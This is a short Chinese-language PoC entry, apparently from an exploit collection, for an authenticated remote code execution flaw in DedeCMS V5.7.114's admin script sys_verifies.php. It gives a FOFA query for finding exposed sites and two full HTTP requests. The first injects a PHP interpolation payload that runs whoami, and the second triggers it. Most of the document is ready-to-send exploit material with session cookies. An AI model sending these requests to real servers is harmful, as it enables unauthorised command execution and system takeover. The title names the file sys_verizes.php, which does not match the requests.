# DedeCMSV5.7.114后台sys_verizes.php存在远程代码执行漏洞

DedeCMS V5.7.114存在远程代码执行漏洞。产生该漏洞的原因是，虽然sys_verizes.php对编辑的文件进行了一定的限制，但攻击者仍然可以绕过这些限制并以某种方式编写代码，从而允许经过身份验证的攻击者利用该漏洞执行任意命令并获得系统权限。

## fofa

```yaml
app="DedeCMS网站内容管理系统"
```

## poc

```yaml
GET /dede/sys_verifies.php?action=getfiles&refiles[]=123${${print%20`whoami`}} HTTP/1.1
Host: 127.0.0.11
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: menuitems=1_1%2C2_1%2C3_1%2C4_1%2C5_1%2C6_1; PHPSESSID=89s6bbv2d1unokav5grt4bk2g4; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=10acd9938ef3615d; DedeLoginTime=1720327720; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=c5e6c12f26661f56; _csrf_name_236f0c58=6d608f0ee0d0e0b59410565dfeec6b2b; _csrf_name_236f0c581BH21ANI1AGD297L1FF21LN02BGE1DNG=bc5881b7b91f1bd9
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=1
```

![2024712-6](https://gitee.com/fushuling/cve/raw/master/2024712-6.png)



```
GET /dede/sys_verifies.php?action=down&curfile=1 HTTP/1.1
Host: 127.0.0.11
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: menuitems=1_1%2C2_1%2C3_1%2C4_1%2C5_1%2C6_1; PHPSESSID=89s6bbv2d1unokav5grt4bk2g4; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=10acd9938ef3615d; DedeLoginTime=1720327720; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=c5e6c12f26661f56; _csrf_name_236f0c58=6d608f0ee0d0e0b59410565dfeec6b2b; _csrf_name_236f0c581BH21ANI1AGD297L1FF21LN02BGE1DNG=bc5881b7b91f1bd9
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=1
```

![20224712-8](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407191227418.png)

## 漏洞来源

- ![](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407191227658.png)